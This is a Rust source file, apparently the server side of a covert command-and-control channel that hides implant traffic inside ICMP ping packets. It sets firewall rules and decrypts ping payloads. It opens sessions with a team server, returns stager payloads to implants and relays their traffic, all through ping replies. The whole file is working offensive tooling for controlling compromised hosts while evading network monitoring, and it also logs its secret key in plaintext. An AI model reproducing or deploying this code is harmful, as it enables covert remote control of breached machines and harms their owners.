#![feature(slice_range)]
#![feature(never_type)]
mod nft;
mod worker;
mod web;
use anyhow::{bail, Result};

use crate::nft::NftRules;
use clap::Parser;
use covert_c2_ping_common::{Arch, PingMessage};
use covert_common::CovertChannel;
use covert_server::{CSFrameRead, CSFrameWrite};
use lazy_static::lazy_static;
use std::{collections::HashMap, sync::Arc, time::Duration};
use tokio::{
    select,
    signal::{self, unix::SignalKind},
    sync::{mpsc, Mutex},
    task,
};
use tracing::{Instrument, Level};
use worker::PingTransaction;

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
struct Config {
    #[clap(long, value_parser,default_value_t=String::from("localhost"))]
    ts: String,
    #[clap(name="interface", long="i", value_parser,default_value_t=String::from("eth0"))]
    i: String,
    #[clap(long, value_parser)]
    key: String,
}

lazy_static! {
    static ref GLOBAL_CONF: Config = Config::parse();
    static ref KEY: [u8; 32] = {
        let key_string = *(&(*GLOBAL_CONF).key.as_bytes());
        let truncated = if key_string.len() > 32 {
            &key_string[..32]
        } else {
            key_string
        };
        let mut key_vec = truncated.to_vec();
        if key_vec.len() < 32 {
            key_vec.append(&mut vec![0u8; 32 - key_vec.len()]);
        }
        return key_vec.try_into().expect("Could not make array");
    };
}

fn main() {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();
    rt.block_on(entry()).unwrap();
    rt.shutdown_timeout(Duration::from_secs(1));
    tracing::info!("Shutdown complete")
}

async fn entry() -> Result<()> {
    let conf = &(*GLOBAL_CONF);
    tracing_subscriber::fmt::init();

    tracing::info!("Team Server: {}", conf.ts);
    tracing::info!("Interface: {}", conf.i);
    tracing::info!("Key: {:02X?}", *KEY);
    tracing::info!("Starting...");

    let web_h = task::spawn(web::web_worker());
    web_h.await?;

    let rules = NftRules::new().or_else(|err| {
        tracing::info!("{:?}", err);
        bail!("Failed to make rules");
    })?;

    let sig_h = task::spawn(
        async move {
            let mut res =
                signal::unix::signal(SignalKind::interrupt()).expect("Couldn't wait on signal");
            res.recv().await;
            tracing::info!("Got SIGINT, starting shutdown");
        }
        .instrument(tracing::span!(Level::INFO, "signal_handle")),
    );

    let (downstream_sender, upstream_receiver, recv_h, send_h) = worker::start_workers()?;

    let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));



    select! {
        // _ = web_h => {}
        _ = recv_h => {}
        _ = send_h => {}
        _ = sig_h => {}
        _ = main_h => {}
    }

    drop(rules);
    tracing::info!("Shutting down");
    Ok(())
}

#[tracing::instrument(skip_all)]
async fn main_loop(
    downstream_sender: mpsc::UnboundedSender<PingTransaction>,
    mut upstream_reciever: mpsc::UnboundedReceiver<PingTransaction>,
) -> Result<()> {
    let channel = Arc::new(Mutex::new(
        covert_common::CovertChannel::<PingMessage, 4>::new(*KEY),
    ));
    let sessions = Arc::new(Mutex::new(
        HashMap::<u16, mpsc::UnboundedSender<PingMessage>>::new(),
    ));
    loop {
        tracing::info!("Waiting for message");
        let incoming_ping = match upstream_reciever.recv().await {
            Some(ping) => ping,
            None => {
                tracing::info!("Upstream worker closed");
                break;
            }
        };
        let channel_state = channel.lock().await.put_packet(&incoming_ping.data);
        let out_data: Vec<u8> = match channel_state {
            Ok((inc_chan, has_message)) => {
                if has_message {
                    let res = channel.lock().await.get_message(inc_chan);
                    match res {
                        Some(in_message) => {
                            handle_message(in_message, inc_chan, sessions.clone(), channel.clone())
                                .await;
                        }
                        None => {
                            tracing::info!("No message in channel");
                        }
                    };
                }
                let (in_num, out_num) = channel.lock().await.packets_in_queue(inc_chan);
                tracing::info!(
                    inbound_packets = in_num,
                    outbound_packets = out_num,
                    channel = inc_chan,
                    "channel status"
                );
                channel.lock().await.get_packet(inc_chan)
            }
            Err(e) => {
                match e {
                    covert_common::CovertError::DecryptionError => {
                        tracing::info!("Failed to decrypt packet")
                    }
                    covert_common::CovertError::InvalidHash => {
                        tracing::info!("Invalid hash in packet")
                    }
                    covert_common::CovertError::DeserializeError => {
                        tracing::info!("Failed to deserialize packets to message")
                    }
                }

                continue;
            }
        };

        let outgoing_ping = PingTransaction {
            src_mac: incoming_ping.dst_mac,
            dst_mac: incoming_ping.src_mac,
            src_ip: incoming_ping.dst_ip,
            dst_ip: incoming_ping.src_ip,
            sequence_number: incoming_ping.sequence_number,
            identifier: incoming_ping.identifier,
            data: out_data,
        };
        if let Err(e) = downstream_sender.send(outgoing_ping) {
            tracing::info!(error=?e,"Downstream worker closed");
            break;
        };
    }
    Ok(())
}

pub async fn handle_message(
    message: PingMessage,
    stream: u16,
    sessions: Arc<Mutex<HashMap<u16, mpsc::UnboundedSender<PingMessage>>>>,
    channel: Arc<Mutex<CovertChannel<PingMessage, 4>>>,
) {
    if let PingMessage::InitMessage(arch, pipename) = message {
        let (sender, mut receiver) = mpsc::unbounded_channel::<PingMessage>();

        task::spawn(async move {
            let arch = match arch {
                Arch::i686 => "x86",
                Arch::X86_64 => "x64",
            };
            let connection = match covert_server::start_implant_session(
                &GLOBAL_CONF.ts,
                arch,
                &pipename,
            )
            .await
            {
                Ok((payload, connection)) => {
                    channel
                        .lock()
                        .await
                        .put_message(PingMessage::DataMessage(payload), stream);
                    connection
                }
                Err(_) => {
                    tracing::info!("Failed to connect to team server");
                    channel
                        .lock()
                        .await
                        .put_message(PingMessage::CloseMessage, stream);
                    return;
                }
            };
            sessions.lock().await.insert(stream, sender);
            let (mut read_tcp, mut write_tcp) = connection.into_split();
            let ts_reader = task::spawn(async move {
                loop {
                    match read_tcp.read_frame().await {
                        Ok(data) => channel
                            .lock()
                            .await
                            .put_message(PingMessage::DataMessage(data), stream),
                        Err(_) => {
                            tracing::info!("Session closed with TS");
                            break;
                        }
                    };
                }
            });
            let ts_writer = task::spawn(async move {
                loop {
                    match receiver.recv().await {
                        Some(PingMessage::DataMessage(data)) => {
                            if let Err(_) = write_tcp.write_frame(&data).await {
                                tracing::info!("Session closed with TS");
                                break;
                            };
                        }
                        Some(_) => {
                            tracing::info!("Invalid message received")
                        }
                        None => {
                            tracing::info!("Session closed with downstream");
                            break;
                        }
                    };
                }
            });
            select! {
                _ = ts_reader => {}
                _ = ts_writer => {}
            };
            sessions.lock().await.remove(&stream);
        });
    } else {
        let mut sessions_guard = sessions.lock().await;
        if let Some(sender) = sessions_guard.get(&stream) {
            if let Err(_) = sender.send(message) {
                sessions_guard.remove(&stream);
            };
        }
    }
}
